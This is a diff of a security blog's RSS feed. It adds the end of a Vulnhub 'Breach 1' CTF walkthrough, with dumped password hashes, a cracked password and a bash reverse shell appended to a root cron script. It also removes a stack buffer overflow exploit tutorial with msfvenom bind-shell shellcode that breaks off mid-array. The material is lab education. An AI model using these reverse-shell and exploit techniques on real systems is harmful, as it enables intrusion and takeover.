+&lt;span class=&#34;go&#34;&gt;| milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| root             |                                           |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| root             |                                           |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+------------------+-------------------------------------------+&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;5 rows in set (0.00 sec)&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;mysql&amp;gt; select login_name,pass from impresscms.i3062034b_users;&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| login_name | pass                                                                                                                                                                                                        |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| admin      | $23$5000$S4mancatNXCgGKpitGa5dTpN0uSo0iSIMPl3X5WdVXSEe8LILqDynHRa3R2OE5pPe-1c70c0c66700b42c4d1f2ec15638b6f5e0bbcbc03c50298ad79f765a33901709d825c9dbb98e703ea71af4bb826469fc0df5eb68e66e4192bf1651c6f06c060c |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| pgibbons   | $23$5000$eemraVuhMjb0muJ8eKaIfAjJuOQorYcJ3HT0TQWVZ3XIR34Suws6rYN6uSQsQOU-5d3e3c6d93b361ca051900d8cfaecbf13c0b96fa76f525683f3a54386e04c4a68594359d15e2599f718af54fcad9a1e85d438e84da1c5af51f1fc3e185ba68a0   |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;| mbolton    | $23$5000$zk0tDm60SfN2vX9CJ3WuCxT3JoiwOmj99VwU3ZfuYwmKSuzhOuSDCLeedS7yhvC2-cac27699650c034aa4114fe1df04cc14e70a7dd6812a5af482e3c73f00b31595aa332242a0b67b0f58df485186d6c8176cafe1365f55097adcf15b307060d3f0  |&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;+------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That escalated quickly.
+A search for the hash value of milton&amp;rsquo;s password provides the cleartext &amp;ldquo;thelaststraw&amp;rdquo;.
+Maybe we can now change user or login.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-1_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;From tomcat to milton.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-1_1.png&#34; alt=&#34;From tomcat to milton.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The session now has more access rights.
+He is even in an admin group.
+Unfortunately, the user has no rights that we could exploit.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; find / -group adm &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&amp;gt; /dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The syslog includes some lines that look intriguing.
+There is a cronjob from the user root running every three minutes.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;Mar  1 19:45:01 Breach CRON[2747]: (root) CMD (/usr/share/cleanup/tidyup.sh)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The script looks promising, let&amp;rsquo;s take a closer look.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;ch&#34;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;#Hacker Evasion Script&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#Initech Cyber Consulting, LLC&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#Peter Gibbons and Michael Bolton - 2016&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#This script is set to run every 3 minutes as an additional defense measure against hackers.&lt;/span&gt;
+
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /var/lib/tomcat6/webapps &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; find swingline -mindepth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xargs rm -rf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As the comments clarify it deletes all files in the swingline directory.
+It is also called on a regular basis as a cronjob.
+But, there is no way that we can edit the file with the current user rights.
+Bill Blumbergh&amp;rsquo;s account remains as a potential vector to elevate privileges.
+No hints on the file system or in the database.
+Something obvious must have slipped.&lt;/p&gt;
+
+&lt;p&gt;Going back to the beginning, bill provided a helpful hint in a picture.
+There might be more information present than is visible.
+First, the meta information is a good place to search.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/bill-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The metadata contains a comment.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/bill-1_0.png&#34; alt=&#34;The metadata contains a comment.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;That looks like a secure password.
+This might even be the password for the command line.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/shell-2_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The password hint worked.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/shell-2_0.png&#34; alt=&#34;The password hint worked.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The user Blumbergh has got sudo rights.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;gp&#34;&gt;blumbergh@Breach:~$&lt;/span&gt; sudo --list
+&lt;span class=&#34;go&#34;&gt;Matching Defaults entries for blumbergh on Breach:&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;    env_reset, mail_badpass,&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;
+
+&lt;span class=&#34;go&#34;&gt;User blumbergh may run the following commands on Breach:&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Awesome!
+We can manually run the afore mentioned script.
+Even better, we can append to files with the &lt;code&gt;tee&lt;/code&gt; command.
+So the way to go is to append something to the &lt;code&gt;tidyup.sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;ch&#34;&gt;#!/bin/bash&lt;/span&gt;
+. /etc/profile
+&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SHELL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/bin/bash
+/bin/bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/192.168.110.129/4444 &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After the shell connects back to the attacker, it can easily be upgraded to a full meterpreter session.
+This makes working and navigating much more convenient.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-2_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;A meterpreter session as root.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/meterpreter-2_0.png&#34; alt=&#34;A meterpreter session as root.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Now there is only one thing left.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/flag-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The final flag.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/flag-1_0.png&#34; alt=&#34;The final flag.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;See who is also there!&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/flair.jpg&#34; data-lightbox=&#34;default&#34; data-title=&#34;Another final flag?&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/flair.jpg&#34; alt=&#34;Another final flag?&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;portspoof&#34;&gt;Portspoof&lt;/h2&gt;
+
+&lt;p&gt;While analyzing the system it became obvious that the system is protected by portspoof.
+The configuration file contains the background information for the confusing service responses.
+The file &lt;code&gt;/usr/local/etc/portspoof.conf&lt;/code&gt; holds the following custom payload configuration.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/portspoof-1_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Trololo&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-1/portspoof-1_0.png&#34; alt=&#34;Trololo&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Very nice.
+Also the service suffers from a weak configuration.
+The &lt;code&gt;/etc/init.d/portly.sh&lt;/code&gt; init script is world writeable.
+In order go escalate privileges one could add code to this file and reboot the system.
+The script is run during startup and boom you have won.&lt;/p&gt;
+
+&lt;h1 id=&#34;links&#34;&gt;Links&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/breach-1,152/&#34;&gt;Breach: 1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;magnet:?xt=urn:btih:E1866D3F2433DD0A3EC022FEA0A2EBF0F03060E2&amp;amp;dn=Breach-1.0.zip&amp;amp;tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&amp;amp;tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&amp;amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&amp;amp;tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&amp;amp;tr=udp%3A%2F%2Ftracker.istole.it%3A6969&#34;&gt;Magnet Link&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://docs.twosevenzero.com/2016/06/27/breach-1-0/&#34;&gt;BREACH 1.0 Walkthrough&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Vulnhub - Mr Robot: 1 boot2root CTF walkthrough</title>
+      <link>http://camelinc.info/blog/2017/02/Vulnhub---Mr-Robot-1-boot2root-CTF-walkthrough/</link>
       <pubDate>Sat, 25 Feb 2017 10:46:59 +0000</pubDate>
       <author>admin@camelinc.de</author>
-      <guid>http://camelinc.info/blog/2017/02/CTF---Mr-Robot/</guid>
+      <guid>http://camelinc.info/blog/2017/02/Vulnhub---Mr-Robot-1-boot2root-CTF-walkthrough/</guid>
       <description>
 
 &lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Find the three flags that are hidden in the vm.&lt;/p&gt;
 
-&lt;h2 id=&#34;information-gathering&#34;&gt;Information gathering&lt;/h2&gt;
+&lt;h1 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h1&gt;
 
 &lt;p&gt;To begin the fun let&amp;rsquo;s run netdiscover to identify the target system.&lt;/p&gt;
 
@@ -91,7 +689,7 @@ key-1-of-3.txt
 
 
 
-&lt;h2 id=&#34;flag-2&#34;&gt;Flag 2&lt;/h2&gt;
+&lt;h1 id=&#34;flag-2&#34;&gt;Flag 2&lt;/h1&gt;
 
 &lt;p&gt;Next, we run wpscan examine the wordpress installation.&lt;/p&gt;
 
@@ -168,7 +766,7 @@ This can easily be done by adding our own php code to one of the templates.&lt;/
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Take a look at the home directories.
+&lt;p&gt;After the reverse meterpreter session has been established, let&amp;rsquo;s take a look at the home directories.
 There is a user robot with the second flag file.
 Unfortunately, we do not have the right access rights, but in the same folder is a password hash for the user that we might be able to crack.&lt;/p&gt;
 
@@ -195,6 +793,9 @@ An interactive version can be started via the following command.&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
+&lt;p&gt;Then we simply login with the robot user and the discovered password.
+This give access to the key file.&lt;/p&gt;
+
 
 
 &lt;figure class=&#34;fcenter&#34;&gt;
@@ -205,7 +806,7 @@ An interactive version can be started via the following command.&lt;/p&gt;
 
 
 
-&lt;h2 id=&#34;flag-3&#34;&gt;Flag 3&lt;/h2&gt;
+&lt;h1 id=&#34;flag-3&#34;&gt;Flag 3&lt;/h1&gt;
 
 &lt;p&gt;After searching the server only the root user&amp;rsquo;s home directory is left.
 To access this folder we somehow need to gain root on the system.
@@ -5489,240 +6090,6 @@ I will Try Harder!&lt;/p&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&#34;&gt;Offensive Security Certified Professional (OSCP) Certification&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow</title>
-      <link>http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</link>
-      <pubDate>Mon, 26 May 2014 13:05:09 +0000</pubDate>
-      <author>admin@camelinc.de</author>
-      <guid>http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</guid>
-      <description>
-
-&lt;h1 id=&#34;prequisites&#34;&gt;Prequisites&lt;/h1&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Windows XP SP3 (en-us)&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/wp-content/themes/exploit/applications/55740fe6c4e56674125a1968a139ed36-AviosoftDTVPlayerPro.exe&#34;&gt;AviosoftDTVPlayerPro&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&#34;triggering-the-overflow&#34;&gt;Triggering the overflow&lt;/h1&gt;
-
-&lt;p&gt;After some fuzzing the basic exploit can be create with the following python code.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;lineno&#34;&gt;1 &lt;/span&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;2 &lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;3 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;4 &lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;5 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;evil.plf&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;6 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt;7 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Opening this file with the vulnerable application results in an access violation with the following register values.&lt;/p&gt;
-
-
-
-&lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/initial_crash.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/initial_crash.png&#34; alt=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-
-
-&lt;p&gt;Great, the EIP is under our control.&lt;/p&gt;
-
-&lt;h1 id=&#34;identifying-eip-offset&#34;&gt;Identifying EIP Offset&lt;/h1&gt;
-
-&lt;p&gt;In order to identify the correct offset of the overflow let&amp;rsquo;s create a pattern and start again.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;!mona pc 2000&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Mona.py creates a unique pattern that has to be opened by the application.
-At the time of the access violation the following register values are presented.&lt;/p&gt;
-
-
-
-&lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/find_pattern.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Identifying the offset of EIP&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/find_pattern.png&#34; alt=&#34;Identifying the offset of EIP&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-
-
-&lt;p&gt;Again, mona.py can help us to identify the correct offset of the overflow.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;!mona findmsp&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;This command does all the magic.
-The output is depicted in the following screenshot.&lt;/p&gt;
-
-
-
-&lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/findmsp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Offset for EIP is 1109&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/findmsp.png&#34; alt=&#34;Offset for EIP is 1109&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-
-
-&lt;p&gt;We can also check the offset manually.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;!mona pattern_offset 37694136&lt;/span&gt;
-&lt;span class=&#34;go&#34;&gt; - Pattern 6Ai7 (0x37694136) found in cyclic pattern at position 260&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Now we know, that we can overwrite the EIP after 260 bytes.
-After updating the initial script, we can now exactly overwrite EIP.&lt;/p&gt;
-
-
-
-&lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/overwrite_eip.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Overwriting EIP with BBBB&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/overwrite_eip.png&#34; alt=&#34;Overwriting EIP with BBBB&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-
-
-&lt;h1 id=&#34;controlling-eip&#34;&gt;Controlling EIP&lt;/h1&gt;
-
-&lt;p&gt;Luckily, ESP points to the bytes after the BBBB.
-So let&amp;rsquo;s identify a location that stores a suiteable JMP ESP.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;!mona jmp -r esp&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Mona.py can list all suitable JMP instructions.&lt;/p&gt;
-
-
-
-&lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;JMP ESP instructions available in process memory.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/jmp_esp.png&#34; alt=&#34;JMP ESP instructions available in process memory.&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-
-
-&lt;p&gt;Let&amp;rsquo;s choose one after identifying the bad characters.&lt;/p&gt;
-
-&lt;h1 id=&#34;identifying-bad-characters&#34;&gt;Identifying Bad Characters&lt;/h1&gt;
-
-&lt;p&gt;Next, we need to verify the valid charset for the exploit.
-Let&amp;rsquo;s create a byte pattern and compare it against loaded data.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;!mona bytearray -b &amp;#39;\x00&amp;#39;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The bad characters \x0A was identified at 0x0012f489.&lt;/p&gt;
-
-
-
-&lt;figure &gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bad_chars.png&#34; alt=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-
-
-&lt;p&gt;Iterating the previous steps until finally, all bad characters have been identified.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;!mona compare -f c:\logs\DVDXPlayer\bytearray.bin&lt;/span&gt;
-&lt;span class=&#34;go&#34;&gt;[+] Comparing with memory at location : 0x0012f480 (Stack)&lt;/span&gt;
-&lt;span class=&#34;go&#34;&gt;!!! Hooray, normal shellcode unmodified !!!&lt;/span&gt;
-&lt;span class=&#34;go&#34;&gt;Bytes omitted from input: 00 0a 1a&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h1 id=&#34;adding-shellcode&#34;&gt;Adding Shellcode&lt;/h1&gt;
-
-&lt;p&gt;Finally, let&amp;rsquo;s add a custom payload to the exploit code.
-With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x1a&amp;#39;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h1 id=&#34;the-exploit&#34;&gt;The Exploit&lt;/h1&gt;
-
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;lineno&#34;&gt; 1 &lt;/span&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 2 &lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 3 &lt;/span&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 4 &lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 5 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#-------------------------------------------------------------------------------------------------------#&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 6 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x1a&amp;#39; #&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 7 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#-------------------------------------------------------------------------------------------------------#&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 8 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xbf\x11\xa0\x1c\x7c\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
-&lt;span class=&#34;lineno&#34;&gt; 9 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x56\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x1e\x42\xe9\x80\xc8\x0b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;
